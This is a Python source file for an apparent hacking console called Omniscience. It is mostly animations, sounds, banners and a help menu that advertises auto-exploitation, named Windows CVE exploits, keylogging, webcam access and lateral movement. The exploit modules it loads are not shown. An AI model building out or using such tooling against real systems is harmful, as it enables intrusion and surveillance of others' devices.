"""
OMNISCIENCE MASTER ORCHESTRATOR (v5.1)
High-Technology Command & Control Center
"""

import os
import sys
import time
import json
import socket
import random
import logging
import threading
import subprocess
from datetime import datetime
from colorama import Fore, Back, Style, init

# Force UTF-8 encoding for Windows console
if sys.platform == 'win32':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleOutputCP(65001)
    kernel32.SetConsoleCP(65001)
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
import winsound
import msvcrt

# Initialize Colorama
init(autoreset=True)

# ULTRA MAX HACKER TERMINAL CONFIGURATION
os.system('color 0A')
os.system('title OMNISCIENCE HACKER MODE v5.1 - SYSTEM ACTIVE')
import ctypes
kernel32 = ctypes.WinDLL('kernel32')
handle = kernel32.GetStdHandle(-11)
ctypes.windll.kernel32.SetConsoleTextAttribute(handle, 0x0A)

# MAXIMIZE CONSOLE WINDOW
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
user32 = ctypes.WinDLL('user32')
user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE

# ULTRA MAX HACKER AUDIO ENGINE
class HackerSounds:
    _thread_pool = []
    
    @staticmethod
    def beep_hack(freq=800, dur=50):
        try:
            t = threading.Thread(target=winsound.Beep, args=(freq, dur), daemon=True)
            t.start()
            HackerSounds._thread_pool.append(t)
        except: pass
    
    @staticmethod
    def matrix_rain_sound():
        for _ in range(random.randint(3,8)):
            f = random.randint(100, 900)
            HackerSounds.beep_hack(f, random.randint(5,20))
            time.sleep(0.01)
    
    @staticmethod
    def scan_beep():
        freqs = [400, 500, 600, 700, 800, 900, 1000, 1100, 1000, 900, 800, 700]
        for f in freqs:
            HackerSounds.beep_hack(f, 15)
            time.sleep(0.02)
    
    @staticmethod
    def success():
        sequence = [300, 500, 700, 900, 1200, 1500, 1700]
        for f in sequence:
            HackerSounds.beep_hack(f, 25)
            time.sleep(0.03)
    
    @staticmethod
    def alert():
        for i in range(5):
            HackerSounds.beep_hack(1400, 60)
            time.sleep(0.07)
    
    @staticmethod
    def access_granted():
        HackerSounds.beep_hack(800, 100)
        time.sleep(0.1)
        HackerSounds.beep_hack(1200, 100)
        time.sleep(0.05)
        HackerSounds.beep_hack(1600, 300)
    
    @staticmethod
    def exploit_success():
        for i in range(12):
            f = 400 + (i * 100)
            HackerSounds.beep_hack(f, 12)
        HackerSounds.beep_hack(2000, 150)
    
    @staticmethod
    def typing():
        f = random.randint(150, 750)
        HackerSounds.beep_hack(f, random.randint(8,22))
    
    @staticmethod
    def network_pulse():
        HackerSounds.beep_hack(600, 10)
        time.sleep(0.01)
        HackerSounds.beep_hack(750, 10)
    
    @staticmethod
    def target_acquired():
        HackerSounds.beep_hack(700, 50)
        time.sleep(0.05)
        HackerSounds.beep_hack(1000, 100)
    
    @staticmethod
    def connection_established():
        for i in [500, 650, 800, 1000, 1200]:
            HackerSounds.beep_hack(i, 20)
            time.sleep(0.03)


# ADVANCED GREEN MATRIX ANIMATION ENGINE
class MatrixEffects:
    @staticmethod
    def rain_line(duration=0.03):
        chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン"
        line = ""
        for _ in range(os.get_terminal_size().columns if sys.stdout.isatty() else 80):
            line += random.choice(chars)
        intensity = random.randint(30, 100)
        if intensity > 80:
            print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{line}")
        elif intensity > 50:
            print(f"{Fore.GREEN}{line}")
        else:
            print(f"{Fore.LIGHTBLACK_EX}{line}")
        time.sleep(duration)
    
    @staticmethod
    def intro_cycle(cycles=12):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.GREEN}{Style.BRIGHT}INITIALIZING OMNISCIENCE FRAMEWORK v5.1...")
        MatrixEffects.loading_animation("System Boot", 2.0)
        MatrixEffects.loading_animation("Loading Modules", 1.5)
        MatrixEffects.loading_animation("Matrix Engine", 1.0)
        MatrixEffects.loading_animation("Hacker Interface", 0.8)

        for i in range(cycles):
            print(f"\n" * random.randint(3,10))
            intensity_msg = ["CALCULATING...", "ANALYZING...", "PROCESSING...", "HACKING..."][i % 4]
            print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{intensity_msg}")
            for _ in range(random.randint(8,25)):
                MatrixEffects.rain_line(0.008)
            HackerSounds.network_pulse()
            os.system('cls' if os.name == 'nt' else 'clear')

        # Final pulse sequence
        HackerSounds.access_granted()
        time.sleep(0.5)
        HackerSounds.exploit_success()
        time.sleep(0.3)

    @staticmethod
    def advanced_welcome():
        """Ultra advanced hacking welcome with multi-threaded animations."""
        import threading
        import time

        # Function for center matrix rain
        def center_rain():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン"
            for _ in range(200):  # Run for a while
                x = random.randint(0, width-1)
                y = random.randint(0, height-1)
                char = random.choice(chars)
                intensity = random.randint(30, 100)
                if intensity > 80:
                    color = Fore.LIGHTGREEN_EX
                elif intensity > 50:
                    color = Fore.GREEN
                else:
                    color = Fore.LIGHTBLACK_EX
                print(f"\033[{y};{x}H{color}{char}", end="", flush=True)
                time.sleep(0.01)

        # Function for giant rotating earth with continents in center
        def rotating_earth():
            earth_frames = [
                """\
     _______
    /       \\
   /  NORTH  \\
  /  AMERICA \\
 /   ATLANTIC \\
|    PACIFIC   |
 \\   ATLANTIC /
  \\  SOUTH   /
   \\ AMERICA /
    \\_______/
""",
                """\
     _______
    /       \\
   /  EUROPE \\
  /   AFRICA \\
 /   ATLANTIC \\
|    PACIFIC   |
 \\   ATLANTIC /
  \\  SOUTH   /
   \\ AMERICA /
    \\_______/
""",
                """\
     _______
    /       \\
   /  AFRICA \\
  /   ASIA    \\
 /   INDIAN   \\
|    PACIFIC   |
 \\   ATLANTIC /
  \\  SOUTH   /
   \\ AMERICA /
    \\_______/
""",
                """\
     _______
    /       \\
   /   ASIA   \\
  /   AUSTRALIA\\
 /   PACIFIC   \\
|    ATLANTIC   |
 \\   INDIAN   /
  \\  AFRICA  /
   \\         /
    \\_______/
""",
                """\
     _______
    /       \\
   / AUSTRALIA\\
  /   PACIFIC  \\
 /   ATLANTIC  \\
|    INDIAN     |
 \\   ASIA     /
  \\         /
   \\ NORTH  /
    \\_______/
""",
                """\
     _______
    /       \\
   /  PACIFIC \\
  /   ATLANTIC \\
 /   NORTH     \\
|    AMERICA    |
 \\   ATLANTIC /
  \\  EUROPE  /
   \\ AFRICA /
    \\_______/
""",
                """\
     _______
    /       \\
   /  ATLANTIC\\
  /   NORTH    \\
 /   AMERICA   \\
|    PACIFIC    |
 \\   EUROPE   /
  \\ AFRICA   /
   \\ ASIA    /
    \\_______/
""",
                """\
     _______
    /       \\
   /   PACIFIC\\
  /   ASIA     \\
 /   AUSTRALIA \\
|    INDIAN     |
 \\   AFRICA   /
  \\ EUROPE   /
   \\ NORTH   /
    \\_______/
"""
            ]
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            y_center = height // 2
            title = "GIGANTIC REAL-TIME ROTATING EARTH WITH CONTINENTS"
            title_x = (width - len(title)) // 2
            print(f"\033[{y_center-8};{title_x}H{Fore.CYAN}{Style.BRIGHT}{title}", end="", flush=True)
            speed = 0.15
            i = 0
            controls = "Controls: Q=Quit, F=Faster, S=Slower, P=Pause, R=Reverse"
            controls_x = (width - len(controls)) // 2
            print(f"\033[{y_center+6};{controls_x}H{Fore.YELLOW}{controls}", end="", flush=True)
            paused = False
            reverse = False
            while True:
                frame_lines = earth_frames[i % len(earth_frames)].split('\n')
                lines = len(frame_lines)
                y_start = y_center - lines // 2
                for j, line in enumerate(frame_lines):
                    x_line = (width - len(line)) // 2
                    # Color continents green, oceans blue
                    colored_line = ""
                    for char in line:
                        if char in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                            colored_line += Fore.GREEN + char
                        elif char in ' ~':
                            colored_line += Fore.BLUE + char
                        else:
                            colored_line += Fore.WHITE + char
                    print(f"\033[{y_start + j};{x_line}H{colored_line}", end="", flush=True)
                utc = datetime.utcnow().strftime("%H:%M:%S UTC")
                utc_x = (width - len(utc)) // 2
                print(f"\033[{y_center+3};{utc_x}H{Fore.WHITE}{utc}", end="", flush=True)
                rotations = i // len(earth_frames)
                rot_text = f"Rotations: {rotations}"
                rot_x = (width - len(rot_text)) // 2
                print(f"\033[{y_center+4};{rot_x}H{Fore.GREEN}{rot_text}", end="", flush=True)
                status = "PAUSED" if paused else "ROTATING"
                status_x = (width - len(status)) // 2
                print(f"\033[{y_center+5};{status_x}H{Fore.RED if paused else Fore.GREEN}{status}", end="", flush=True)
                if not paused:
                    time.sleep(speed)
                    i += 1 if not reverse else -1
                else:
                    time.sleep(0.1)
                if msvcrt.kbhit():
                    key = msvcrt.getch().lower()
                    if key == b'q':
                        break
                    elif key == b'f':
                        speed = max(0.01, speed - 0.03)
                    elif key == b's':
                        speed = min(0.5, speed + 0.03)
                    elif key == b'p':
                        paused = not paused
                    elif key == b'r':
                        reverse = not reverse
                HackerSounds.beep_hack(200 + (i % 50), 5)

        # Function for network features on right side
        def network_panel():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            x = width - 30  # Right side
            y_start = 5
            networks = [
                "Scanning 192.168.1.0/24",
                "Found: 192.168.1.1 (GW)",
                "Found: 192.168.1.100 (PC)",
                "Vuln: EternalBlue",
                "Port 445 OPEN",
                "SMB Version: 3.0",
                "Exploiting...",
                "SUCCESS: Shell obtained"
            ]
            for i in range(len(networks) * 2):
                for j, net in enumerate(networks):
                    if i >= j:
                        status = "✓" if i > j else "⟳"
                        color = Fore.GREEN if i > j else Fore.YELLOW
                        print(f"\033[{y_start + j};{x}H{color}{status} {net}", end="", flush=True)
                HackerSounds.beep_hack(random.randint(600, 1000), 10)
                time.sleep(0.2)

        # Function for middle hacking messages
        def middle_hack():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            messages = [
                "INITIALIZING HACKER MATRIX...",
                "LOADING EXPLOIT CHAINS...",
                "CONNECTING TO DARK WEB...",
                "BREACHING FIREWALLS...",
                "GAINING ROOT ACCESS...",
                "DOMINATING NETWORK...",
                "OMNISCIENCE ACTIVE!"
            ]
            for msg in messages:
                x = (width - len(msg)) // 2
                y = height // 2 + 2
                print(f"\033[{y};{x}H{Fore.RED}{Style.BRIGHT}{msg}", end="", flush=True)
                HackerSounds.alert()
                time.sleep(0.5)
                print(f"\033[{y};{x}H{' ' * len(msg)}", end="", flush=True)  # Clear

        # Start threads
        threads = []
        threads.append(threading.Thread(target=center_rain, daemon=True))
        threads.append(threading.Thread(target=rotating_earth, daemon=True))
        threads.append(threading.Thread(target=network_panel, daemon=True))
        threads.append(threading.Thread(target=middle_hack, daemon=True))

        for t in threads:
            t.start()

        # Wait for animations
        time.sleep(5)

        # Clear screen
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def loading_animation(text, duration=2.0):
        chars = "▁▂▃▄▅▆▇█▇▆▅▄▃▂▁"
        end = time.time() + duration
        i = 0
        while time.time() < end:
            frame = chars[i % len(chars)]
            print(f"\r  {Fore.GREEN}{frame} {Fore.LIGHTGREEN_EX}{text}...", end="", flush=True)
            i += 1
            time.sleep(0.05)
        print(f"\r  {Fore.GREEN}✔ {Fore.LIGHTGREEN_EX}{text} [COMPLETE]{Style.RESET_ALL}   ")
    
    @staticmethod
    def scanning_animation():
        blocks = "█▓▒░▪▫"
        while True:
            if random.random() < 0.7:
                c = random.choice(blocks)
                intensity = random.randint(30, 100)
                if intensity > 80:
                    sys.stdout.write(f"{Fore.LIGHTGREEN_EX}{c}")
                elif intensity > 50:
                    sys.stdout.write(f"{Fore.GREEN}{c}")
                else:
                    sys.stdout.write(f"{Fore.LIGHTBLACK_EX}{c}")
                sys.stdout.flush()
            time.sleep(0.005)
    
    @staticmethod
    def target_lock():
        for i in range(5):
            print(f"\r  {Fore.GREEN}🔓 {Fore.LIGHTGREEN_EX}TARGET ACQUISITION {'.'*(i%4)}", end="", flush=True)
            HackerSounds.beep_hack(600 + (i*100), 30)
            time.sleep(0.2)
        print(f"\r  {Fore.GREEN}🔒 {Fore.LIGHTGREEN_EX}TARGET LOCKED - READY FOR ENGAGEMENT{Style.RESET_ALL}")
        HackerSounds.target_acquired()

# Configuration
LOG_FILE = "omniscience.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | OmniShell | %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, mode="a")]
)
logger = logging.getLogger("Omniscience.OmniShell")

# Robust Module Loading Utility
_MODULE_MAP = {
    "1": "network_discovery",
    "2": "passive_intel",
    "3": "remote_control",
    "5": "advanced_scanner",
    "6": "lateral_movement",
    "7": "exploit_engine",
}

def get_module(name):
    try:
        import importlib.util
        filename = _MODULE_MAP.get(str(name), name)
        for candidate in [filename, name]:
            if os.path.exists(f"{candidate}.py"):
                spec = importlib.util.spec_from_file_location(f"mod_{candidate}", f"{candidate}.py")
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                return module
    except Exception as e:
        logger.error(f"Failed to load module '{name}': {e}")
    return None

# Visualizer Class
class Visualizer:
    """Premium UI Utilities."""
    
    ASCII_CHARS = ['@', '#', 'S', '%', '?', '*', '+', ':', '.', ' ']

    # GREEN HACKER THEME ONLY
    _GRAD = [Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN]

    @staticmethod
    def _sep(char="═", width=80, color=Fore.GREEN):
        return f"{color}{Style.BRIGHT}{char * width}"

    @staticmethod
    def banner():
        W = 100
        lines = [
            r"  ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            r"  ██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            r"  ██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            r"  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            r"  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
            r"   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝",
            r"",
            r"  ╔══════════════════════════════════════════════════════════════════════════════════════╗",
            r"  ║                        ULTRA ADVANCED HACKER COMMAND CENTER                        ║",
            r"  ║                    NETWORK DOMINATION │ EXPLOIT CHAINS │ TOTAL CONTROL             ║",
            r"  ╚══════════════════════════════════════════════════════════════════════════════════════╝",
        ]
        grad_colors = [Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.CYAN, Fore.CYAN, Fore.WHITE]
        print()
        print(f"{Fore.GREEN}{Style.BRIGHT}{'╔' + '═'*98 + '╗'}")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")
        for i, line in enumerate(lines):
            color = grad_colors[i % len(grad_colors)]
            if line.strip():
                print(f"{Fore.GREEN}{Style.BRIGHT}║ {color}{Style.BRIGHT}{line}{Fore.GREEN} {' '*(98-len(line))}║")
            else:
                print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")

        # System Info Section
        import platform
        system_info = [
            f"OS: {platform.system()} {platform.release()}",
            f"Python: {platform.python_version()}",
            f"Architecture: {platform.machine()}",
            f"Hostname: {socket.gethostname()}",
            f"IP: {socket.gethostbyname(socket.gethostname())}"
        ]

        for info in system_info:
            pad = (98 - len(info)) // 2
            print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{info}{Fore.GREEN}{' '*(98-pad-len(info))}║")

        tagline = "▸ HACKER MODE ACTIVE  ◂  REAL NETWORK ATTACK SYSTEM  ◂  VERSION 5.1  ◂  ULTRA MAX POWER"
        pad = (98 - len(tagline)) // 2
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{tagline}{Fore.GREEN}{' '*(98-pad-len(tagline))}║")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info = f"[ SECURE SESSION: {now} │ FRAMEWORK READY │ ALL MODULES LOADED ]"
        pad2 = (98 - len(info)) // 2
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad2}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{info}{Fore.GREEN}{' '*(98-pad2-len(info))}║")
        print(f"{Fore.GREEN}{Style.BRIGHT}{'╚' + '═'*98 + '╝'}")
        print()

        # Second banner with different style
        print(f"{Fore.BLUE}{Style.BRIGHT}{'╔' + '═'*98 + '╗'}")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")
        for i, line in enumerate(lines[:6]):  # Only the ASCII art part
            color = grad_colors[i % len(grad_colors)]
            print(f"{Fore.BLUE}{Style.BRIGHT}║ {color}{Style.BRIGHT}{line}{Fore.BLUE} {' '*(98-len(line))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")

        features = [
            "▸ ETERNALBLUE │ SMBGHOST │ PRINTNIGHTMARE │ PETITPOTAM │ ZEROLOGON",
            "▸ ADVANCED SCANNER │ LATERAL MOVEMENT │ PERSISTENCE │ DATA EXTRACTION",
            "▸ LIVE MONITORING │ WEBCAM │ AUDIO │ KEYLOGGER │ REMOTE CONTROL",
            "▸ BRUTE FORCE │ EXPLOIT CHAINS │ CLOUD ATTACKS │ DATABASE DUMP"
        ]

        for feature in features:
            pad = (98 - len(feature)) // 2
            print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad}{Fore.YELLOW}{Style.BRIGHT}{feature}{Fore.BLUE}{' '*(98-pad-len(feature))}║")

        tagline = "▸ Advanced Network Command & Control Center  ◂  Version 5.1  ◂  Windows 7 → 11  ◂  MAX POWER"
        pad = (98 - len(tagline)) // 2
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad}{Fore.YELLOW}{Style.BRIGHT}{tagline}{Fore.BLUE}{' '*(98-pad-len(tagline))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*98}║")

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info = f"[ Session: {now} │ Ready for Domination │ Type 'help' for 140+ Commands ]"
        pad2 = (98 - len(info)) // 2
        print(f"{Fore.BLUE}{Style.BRIGHT}║{' '*pad2}{Fore.GREEN}{Style.BRIGHT}{info}{Fore.BLUE}{' '*(98-pad2-len(info))}║")
        print(f"{Fore.BLUE}{Style.BRIGHT}{'╚' + '═'*98 + '╝'}")
        print()

    @staticmethod
    def section_header(title: str, color=Fore.CYAN, icon=""):
        w = 78
        line = f"  {icon}  {title}  " if icon else f"  {title}  "
        pad = w - len(line) - 4
        print(f"\n{color}{Style.BRIGHT}╔══{line}{'═'*pad}╗")

    @staticmethod
    def section_footer(color=Fore.CYAN):
        print(f"{color}{Style.BRIGHT}╚{'═'*78}╝")

    @staticmethod
    def progress_bar(label: str, pct: float, width: int = 40, color=Fore.GREEN):
        filled = int(width * pct / 100)
        bar = "█" * filled + "░" * (width - filled)
        print(f"  {Fore.WHITE}{label:<22} {color}{Style.BRIGHT}[{bar}] {pct:5.1f}%")

    @staticmethod
    def loading_sequence(steps: list):
        """Animate a startup loading sequence."""
        spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        for i, step in enumerate(steps):
            for j in range(6):
                sp = spinner[(i * 6 + j) % len(spinner)]
                print(f"\r  {Fore.CYAN}{Style.BRIGHT}{sp} {Fore.WHITE}{step}...", end="", flush=True)
                time.sleep(0.05)
            print(f"\r  {Fore.GREEN}{Style.BRIGHT}✔ {Fore.WHITE}{step:<50}{Fore.GREEN} [OK]   ")

    @staticmethod
    def table(headers, rows, title=None):
        if title:
            w = 78
            t = f"  ◈  {title}  ◈"
            pad = max(0, w - len(t) - 2)
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}╔═{t}{'═'*pad}╗")
        if not rows:
            print(f"  {Fore.RED}  [No data]")
            if title:
                print(f"{Fore.YELLOW}{Style.BRIGHT}╚{'═'*78}╝")
            return

        widths = [len(h) for h in headers]
        for row in rows:
            for i, val in enumerate(row):
                if i < len(widths):
                    widths[i] = max(widths[i], len(str(val)))

        sep = "  " + "─┼─".join("─" * w for w in widths)
        header_row = "  " + "  │  ".join(f"{Fore.CYAN}{Style.BRIGHT}{headers[i]:<{widths[i]}}" for i in range(len(headers)))
        print(f"{Fore.WHITE}{Style.BRIGHT}{header_row}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{sep}")

        for ri, row in enumerate(rows):
            row_color = Fore.WHITE if ri % 2 == 0 else Fore.LIGHTWHITE_EX
            cells = []
            for i in range(len(headers)):
                val = str(row[i]) if i < len(row) else ""
                cells.append(f"{row_color}{val:<{widths[i]}}")
            print(f"  {'  │  '.join(cells)}{Style.RESET_ALL}")

        if title:
            print(f"{Fore.YELLOW}{Style.BRIGHT}╚{'═'*78}╝")
        print()

    @staticmethod
    def status_line(label, value, color=Fore.GREEN):
        print(f"  {Fore.WHITE}{Style.BRIGHT}{label:<22}{Fore.BLUE}│  {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")

    @staticmethod
    def alert(msg: str, level: str = "info"):
        icons  = {"info": "ℹ", "warn": "⚠", "error": "✘", "ok": "✔", "hack": "☠"}
        colors = {"info": Fore.CYAN, "warn": Fore.YELLOW, "error": Fore.RED, "ok": Fore.GREEN, "hack": Fore.RED}
        icon  = icons.get(level, "•")
        color = colors.get(level, Fore.WHITE)
        print(f"  {color}{Style.BRIGHT}{icon}  {msg}{Style.RESET_ALL}")

    @staticmethod
    def display_screenshot(image_path):
        """Display screenshot as ASCII art."""
        try:
            from PIL import Image
            img = Image.open(image_path)
            img = img.resize((80, 40), Image.Resampling.LANCZOS)
            img = img.convert('L')
            pixels = img.getdata()
            ascii_str = ""
            for i, pixel in enumerate(pixels):
                char_index = int(pixel / 256 * len(Visualizer.ASCII_CHARS))
                char_index = min(char_index, len(Visualizer.ASCII_CHARS) - 1)
                ascii_str += Visualizer.ASCII_CHARS[char_index]
                if (i + 1) % 80 == 0:
                    ascii_str += "\n"
            print(f"\n{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.YELLOW}{Style.BRIGHT}  REMOTE SCREENSHOT: {image_path}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80)
            print(f"{Fore.WHITE}{ascii_str}")
            print(f"{Fore.CYAN}{Style.BRIGHT}" + "="*80 + "\n")
        except ImportError:
            print(f"{Fore.RED}[PIL not installed - install with: pip install pillow]")
        except Exception as e:
            print(f"{Fore.RED}[Error displaying screenshot: {e}]")

# OmniShell Main Class
class OmniShell:
    """The Final Master Orchestrator."""
    
    def __init__(self, on_output=None):
        self.running = True
        self.selected_target = None
        self.credentials = {"user": "Administrator", "pass": "", "domain": ""}
        self.command_history = []
        self.on_output = on_output
        self.hosts = []
        self.interactive_events = []
        self._start_time = datetime.now()

        print(f"\n  {Fore.CYAN}{Style.BRIGHT}◈  Initializing Omniscience Framework v5.1 ...")
        print(f"  {Fore.BLUE}{'─'*60}")

        # Animated module loading
        modules_cfg = [
            ("1", "NetworkDiscovery",       "Discovery Engine        "),
            ("2", "AgentlessIntelligence",  "Intelligence Module     "),
            ("3", "AgentlessControl",       "Control Engine (Win7-11)"),
            ("5", "AdvancedNetworkScanner", "Advanced Scanner        "),
            ("6", "AdvancedCommandCenter",  "Command Center          "),
            ("7", "UniversalNetworkAccess", "Universal Access Engine "),
        ]

        loaded = {}
        spinner = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        for idx, (mod_num, class_name, label) in enumerate(modules_cfg):
            for j in range(8):
                sp = spinner[(idx * 8 + j) % len(spinner)]
                print(f"\r  {Fore.CYAN}{Style.BRIGHT}{sp}  {Fore.WHITE}Loading {label}", end="", flush=True)
                time.sleep(0.04)
            m = get_module(mod_num)
            loaded[mod_num] = m
            if m and hasattr(m, class_name):
                print(f"\r  {Fore.GREEN}{Style.BRIGHT}✔  {Fore.WHITE}{label}{Fore.GREEN}  LOADED   ")
            else:
                print(f"\r  {Fore.YELLOW}{Style.BRIGHT}⚠  {Fore.WHITE}{label}{Fore.YELLOW}  DEGRADED ")

        self.discovery = loaded["1"].NetworkDiscovery()  if loaded.get("1") and hasattr(loaded["1"], 'NetworkDiscovery')       else None
        self.intel     = loaded["2"].AgentlessIntelligence() if loaded.get("2") and hasattr(loaded["2"], 'AgentlessIntelligence') else None
        self.control   = loaded["3"].AgentlessControl()  if loaded.get("3") and hasattr(loaded["3"], 'AgentlessControl')       else None
        self.adv_scan  = loaded["5"].AdvancedNetworkScanner() if loaded.get("5") and hasattr(loaded["5"], 'AdvancedNetworkScanner') else None
        self.center    = loaded["6"].AdvancedCommandCenter()  if loaded.get("6") and hasattr(loaded["6"], 'AdvancedCommandCenter')  else None
        self.universal = loaded["7"].UniversalNetworkAccess() if loaded.get("7") and hasattr(loaded["7"], 'UniversalNetworkAccess') else None

        if self.center and self.discovery and self.intel and self.control:
            try:
                self.center.set_modules(discovery=self.discovery, intel=self.intel, control=self.control)
            except:
                pass

        if self.intel:
            try:
                self.intel.add_activity_callback(self._on_intel_event)
            except:
                pass

        # Status summary
        print(f"\n  {Fore.BLUE}{'─'*60}")
        mods_ok = sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)
        print(f"  {Fore.GREEN}{Style.BRIGHT}✔  {mods_ok}/6 modules active")
        print(f"  {Fore.CYAN}{Style.BRIGHT}◈  Win7 + Win10/11 exploit chains: {Fore.GREEN}ENABLED")
        print(f"  {Fore.CYAN}{Style.BRIGHT}◈  CVE coverage: EternalBlue │ SMBGhost │ PrintNightmare │ Zerologon │ PetitPotam")
        print(f"  {Fore.BLUE}{'─'*60}")
        print(f"\n  {Fore.GREEN}{Style.BRIGHT}● Omniscience Framework READY  │  Type 'help' for commands\n")

    def _on_intel_event(self, event):
        self.interactive_events.append(event)
        if len(self.interactive_events) > 100:
            self.interactive_events.pop(0)

    def _print(self, msg):
        """Standardized print that supports GUI callback."""
        if self.on_output:
            self.on_output(msg)
        else:
            print(msg)

    def _log(self, message):
        """Helper to handle output for CLI or GUI."""
        if self.on_output:
            self.on_output(message)
        else:
            print(message)
            
    def print_help(self):
        """Print FULL ULTRAMAX command reference - ALL 140+ COMMANDS"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}{Style.BRIGHT}║                      OMNISCIENCE ULTRAMAX PRO COMMANDS                       ║")
        print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝\n")
        
        # ==================== SCANNING COMMANDS ====================
        print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ SCANNING COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  auto                  Automatic full network scan")
        print(f"{Fore.GREEN}  globalscan            ULTRAMAX 10km global scan (all networks)")
        print(f"{Fore.GREEN}  scan <range>          Scan specific network range")
        print(f"{Fore.GREEN}  fastscan              Quick 10-second network sweep")
        print(f"{Fore.GREEN}  targets               List all discovered devices")
        print(f"{Fore.GREEN}  cloud-scan <provider> Scan public cloud ranges (aws/azure/gcp)")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ TARGET SELECTION ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  select <idx>          Select target and AUTO-EXPLOIT")
        print(f"{Fore.GREEN}  target <ip>           Set manual target IP")
        print(f"{Fore.GREEN}  target                Show current selected target")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ ATTACK COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  attack / pwnall       Auto-exploit ALL discovered devices")
        print(f"{Fore.GREEN}  pwn <ip>              Exploit specific target")
        print(f"{Fore.GREEN}  exploit <ip>          Advanced exploit chain execution")
        print(f"{Fore.GREEN}  mobile <ip>           Mobile device auto-exploitation")
        print(f"{Fore.GREEN}  scan-exploit <range>  Scan and auto-exploit entire range")
        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ EXPLOIT CHAINS ━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Fore.GREEN}  smbghost <ip>         CVE-2020-0796 SMBGhost exploit")
        print(f"{Fore.GREEN}  printnightmare <ip>   CVE-2021-34527 PrintNightmare exploit")
        print(f"{Fore.GREEN}  petitpotam <ip>       CVE-2021-36942 PetitPotam exploit")
        print(f"{Fore.GREEN}  zerologon <ip>        CVE-2020-1472 Zerologon exploit")
        print(f"{Fore.GREEN}  smb-vulns <ip>        Full SMB vulnerability scan")
